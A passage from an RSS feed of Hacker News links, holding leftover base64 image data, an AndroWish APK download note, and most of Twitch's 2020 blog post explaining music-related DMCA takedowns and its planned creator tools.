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">
</td></tr>
</tbody></div><p>The current AndroWish-debug.apk can be downloaded <a href="https://www.androwish.org/download/AndroWish-c48f047f5b-debug.apk">here</a> (about 36 MByte, requires "install from unknown sources" in Android settings). Prehistoric versions are <a href="http://www.ch-werner.de/sdltk/AndroWish">still available here</a>.


</p></div>]]>
            </description>
            <link>https://www.androwish.org/index.html/home</link>
            <guid isPermaLink="false">hacker-news-small-sites-25061292</guid>
            <pubDate>Wed, 11 Nov 2020 18:36:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Music-Related Copyright Claims and Twitch]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25061259">thread link</a>) | @haunter
<br/>
November 11, 2020 | https://blog.twitch.tv/en/2020/11/11/music-related-copyright-claims-and-twitch/ | <a href="https://web.archive.org/web/*/https://blog.twitch.tv/en/2020/11/11/music-related-copyright-claims-and-twitch/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-i18n="ba2fc6a46b864e1cc0b2afadb1eff0cf-content">
    <p>Creators, we hear you. Your frustration and confusion with recent music-related copyright issues is completely justified. Things can–and should–be better for creators than they have been recently, and this post outlines our next steps to get there. Moving forward, we’ll be more transparent with what’s happening and what tools and resources we’re building to help.</p>

<p>Copyright law and the DMCA are not small or simple topics, so this won’t be a brief post. We’ll do our best to keep the legalese to a minimum, though there’s bound to be technical terms here and there.&nbsp;</p>

<h4 id="dmca-and-twitch"><strong>DMCA and Twitch</strong></h4>

<p>First off, a quick review of what DMCA actually is. The Digital Millennium Copyright Act (“DMCA”) is a set of US laws that allows you to create and share content on digital service providers like Twitch. We comply with the DMCA and similar laws worldwide. Part of complying means that when a copyright holder thinks a streamer has used their content without permission, we have a process in place for them to be able to request the content be taken down.</p>

<p>When we receive a DMCA notification, we process the notification in accordance with our <a href="https://www.twitch.tv/p/legal/dmca-guidelines/">DMCA Guidelines</a>. This includes removing the content, sharing the details with the channel owner, and tracking the allegation.&nbsp;</p>

<p>DMCA takedown notifications can affect your ability to stream because we, as part of our efforts to comply with the DMCA and similar global laws, issue and track copyright strikes and ban the accounts of those who repeatedly infringe the copyrights of others.&nbsp;</p>

<p>This policy is important because we respect the rights of all creators, including those who create or record music, as well as the rights of those who own and control copyrights. As a company that is built around a community of people who create content, we take allegations of copyright infringement seriously.&nbsp;</p>

<h4 id="recent-dmca-notifications"><strong>Recent DMCA notifications</strong></h4>

<p>How did we get to this moment? Until May of this year, streamers received <strong>fewer than 50 music-related DMCA notifications each year</strong> on Twitch. Beginning in May, however, representatives for the major record labels started sending <strong>thousands of DMCA notifications each week</strong> that targeted creators’ archives, mostly for snippets of tracks in years-old Clips. We continue to receive large batches of notifications, and we don’t expect that to slow down.&nbsp;</p>

<p>This means two things: 1) if you play recorded music on your stream, you need to stop doing that and 2) if you haven’t already, you should review your historical VODs and Clips that may have music in them and delete any archives that might.&nbsp;</p>

<p>We were as surprised by this sudden avalanche of notifications as many of you were. We also realized that we needed to provide streamers with more educational programs and content management tools to help you deal with this unprecedented number of notifications coming in all at once. So, while we continued to remove content targeted by these notifications as required by the DMCA, we understood VODs and Clips from years ago may not necessarily reflect your current approach to music. Therefore, we also paused the processing of strikes associated with these batched notifications in order to give you the tools, information, and time that you would need to deal with them.</p>

<p>We have analyzed the notifications we received during that period from the end of May through the middle of October. What we found is that more than 99% of the notifications were for tracks that streamers were playing in the background of their stream.&nbsp;</p>

<p>The point of the DMCA is to strike a balance between the interests of rights holders (the major record labels in this case) and creators. Because of this, we were compelled to delete the VODs and Clips that were identified in the notifications. This showed our commitment to upholding our obligations under the DMCA, while affording us the opportunity to sort out the best way to handle issuing strikes in these circumstances. Under these extraordinary circumstances, we recognized creators should have a reasonable chance to understand that content created in the past was being targeted as allegedly infringing and be given an opportunity to change their approach to music use before they got hit with strikes.</p>

<p>This led to the current situation, which is understandably frustrating and worrying for many of you. Given the circumstances, the warning email many of you received didn’t include all the information that you’d typically get in a DMCA notification (normally, when we receive a DMCA notification against your channel, we send you an email that includes information about the allegedly infringed work, who the claimant is, how the claimant can be contacted, and possible penalties under our repeat infringer policy, so that you can make an informed decision about whether to submit a counter notification or seek a retraction). We hear your feedback about how frustratingly little information we provided, and we should have made that warning email a lot more informative and helpful.</p>

<p>Over the last several months, we have done our best to manage this situation on behalf of both rights holders and creators. One of the mistakes we made was not building adequate tools to allow creators to manage their own VOD and Clip libraries. You’re rightly upset that the only option we provided was a mass deletion tool for Clips, and that we only gave you three-days notice to use this tool. We could have developed more sophisticated, user-friendly tools awhile ago. That we didn’t is on us. And we could have provided creators with a longer time period to address their VOD and Clip libraries – that was a miss as well. We’re truly sorry for these mistakes, and we’ll do better.</p>

<h4 id="how-to-avoid-dmca-notifications"><strong>How to avoid DMCA notifications&nbsp;</strong></h4>

<p>One important question we’ve heard from you is: how can I stream safely and confidently on Twitch without having to worry about getting DMCA notifications from music use?</p>

<p>Most importantly, <strong>don’t play recorded music in your stream</strong> unless you own all rights in the music, or you have the permission of the necessary rights holder(s). Doing this is the best protection for your streams going forward. If you’re unsure whether you own all the rights, it’s pretty likely you don’t. If you want to include recorded music in your stream, use a fully licensed alternative like Soundtrack by Twitch, or other rights cleared music libraries such as Soundstripe, Monstercat Gold, Chillhop, Epidemic Sound, and NCS.</p>

<p>While we haven’t received more than a handful of DMCA notifications targeting in-game music, if you’re playing games with recorded music in them, we recommend you review their End User License Agreements (that wall of text at the beginning of a game) to see how the terms cover streaming with that music. One way to do this is to search for a game’s official EULA online and then do a ctrl+f (Command+f on Mac) search for words like “stream,” “licensed,” and “music” to point you toward the correct sections. If you’re unsure about the rights, some games allow you to turn off music when streaming, or you can mute the game audio yourself. If neither of those apply, consider turning off VODs and Clips.&nbsp;</p>

<p>For your stream archives (VODs and Clips), right now your only options, if you think they contain unauthorized music, is to either go through them one by one, or, for Clips, use the “delete all” tool we’ve provided. We understand both of these options have downsides, and we’re working to provide you more and better options as soon as possible. These things will take time to get right, and new challenges may appear in the future. Regardless, we’re committing here and now to investing in building better tools and keeping you posted on our progress.</p>

<h4 id="new-products-and-tools"><strong>New products and tools</strong></h4>

<p>Ever since the influx of DMCA notifications began, we have been working on building new (and improving existing) tools to help creators (such as the Clips mass deletion tool). This work is still happening. Many of these changes won’t be visible to the community, but we’re focused on three areas where we heard you need more support from us:</p>

<p>First, you don’t have enough control over the recorded content on your channel. We have made improvements to enable you to mass delete Clips, but in addition, we will (1) expand the use of technology to detect copyrighted audio, and (2) give you more granular ways to manage your archive instead of just a “delete all” option.</p>

<p>Second, we’ll make it easier for you to control what audio from your live streams will show up in your recorded content. Soundtrack by Twitch has some of this technology built into it, and we’ll work to make it available for everyone regardless of whether you want to use Soundtrack, for which we’ve cleared all necessary rights, or music from others that provide rights-cleared music.</p>

